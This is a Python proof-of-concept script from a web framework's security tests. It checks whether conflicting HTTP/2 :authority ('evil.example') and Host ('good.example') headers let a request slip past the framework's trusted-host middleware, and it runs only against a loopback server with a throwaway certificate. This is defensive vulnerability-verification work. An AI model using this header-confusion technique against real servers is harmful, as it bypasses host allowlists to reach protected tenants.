"""PoC: cross the trusted-host boundary with conflicting HTTP/2 authority.

Run from the repository root::

    uv run python tests/security/poc_http2_authority_confusion.py

The script binds only to loopback and uses TLS+ALPN, Wreath's metal event loop,
native HTTP/2 protocol, and an independent test HPACK encoder.  The request is
for ``evil.example`` in HTTP/2 control data but supplies ``Host: good.example``.
A vulnerable build lets TrustedHostMiddleware validate the latter and runs the
handler for the former.
"""

from __future__ import annotations

import asyncio
import datetime
import os
import socket
import ssl
import sys
import tempfile
import threading
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parents[1]))
from http2 import support as h2

from wreath import Wreath
from wreath.middleware import TrustedHostMiddleware
from wreath.reactor import metal_event_loop
from wreath.server import Server, ServerConfig, TLSConfig


def _certificate() -> tuple[str, str]:
    from cryptography import x509
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.x509.oid import NameOID

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    name = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "localhost")])
    now = datetime.datetime.now(datetime.UTC)
    certificate = (
        x509.CertificateBuilder()
        .subject_name(name)
        .issuer_name(name)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(days=1))
        .not_valid_after(now + datetime.timedelta(days=1))
        .sign(key, hashes.SHA256())
    )
    cert_fd, cert_path = tempfile.mkstemp(suffix=".pem")
    key_fd, key_path = tempfile.mkstemp(suffix=".pem")
    os.write(cert_fd, certificate.public_bytes(serialization.Encoding.PEM))
    os.close(cert_fd)
    os.write(
        key_fd,
        key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.TraditionalOpenSSL,
            serialization.NoEncryption(),
        ),
    )
    os.close(key_fd)
    return cert_path, key_path


def _exchange(
    port: int,
    output: list[bytes],
    loop: asyncio.AbstractEventLoop,
    finished: asyncio.Event,
) -> None:
    try:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        context.set_alpn_protocols(["h2"])
        raw = socket.create_connection(("127.0.0.1", port), timeout=5)
        with context.wrap_socket(raw, server_hostname="evil.example") as client:
            headers = [
                (b":method", b"GET"),
                (b":path", b"/"),
                (b":scheme", b"https"),
                (b":authority", b"evil.example"),
                (b"host", b"good.example"),
            ]
            client.sendall(h2.PREFACE + h2.encode_settings({}))
            client.sendall(h2.build_headers_frame(1, headers, end_stream=True))
            client.settimeout(1)
            response = bytearray()
            try:
                while part := client.recv(4096):
                    response += part
            except TimeoutError:
                pass
            output.append(bytes(response))
    finally:
        loop.call_soon_threadsafe(finished.set)


async def _drive(server: Server, port: int) -> bytes:
    output: list[bytes] = []
    loop = asyncio.get_running_loop()
    finished = asyncio.Event()
    thread = threading.Thread(target=_exchange, args=(port, output, loop, finished))
    thread.start()
    await finished.wait()
    thread.join()
    await server.close()
    return output[0]


def _status(response: bytes) -> bytes | None:
    parser = h2.FrameParser()
    parser.feed(response)
    decoder = h2.HpackDecoder()
    for frame in parser.frames():
        if frame.type == h2.HEADERS and frame.stream_id == 1:
            return dict(decoder.decode(frame.payload)).get(b":status")
    return None


def main() -> int:
    cert_path, key_path = _certificate()
    seen_hosts: list[str | None] = []
    app = Wreath()
    app.add_middleware(TrustedHostMiddleware(("good.example",)))

    @app.get("/")
    async def index(request) -> str:
        seen_hosts.append(request.header("host"))
        return "protected tenant"

    loop = metal_event_loop(gc_mode="stock")
    try:
        tls = TLSConfig(certfile=cert_path, keyfile=key_path)
        config = ServerConfig(
            host="127.0.0.1",
            port=0,
            protocols=("h2",),
            lifespan="off",
        )
        server = Server(app, config, loop)
        loop.run_until_complete(
            server._start(ssl=tls.build_ssl_context(("h2",)), tls=None)
        )
        port = server.sockets[0].getsockname()[1]
        response = loop.run_until_complete(_drive(server, port))
    finally:
        loop.close()
        os.unlink(cert_path)
        os.unlink(key_path)

    status = _status(response)
    vulnerable = status == b"200" and seen_hosts == ["good.example"]
    print(f"HTTP/2 :status {status!r}")
    print(f"application Host: {seen_hosts!r}")
    print("VULNERABLE" if vulnerable else "not vulnerable")
    return 0 if vulnerable else 1


if __name__ == "__main__":
    raise SystemExit(main())
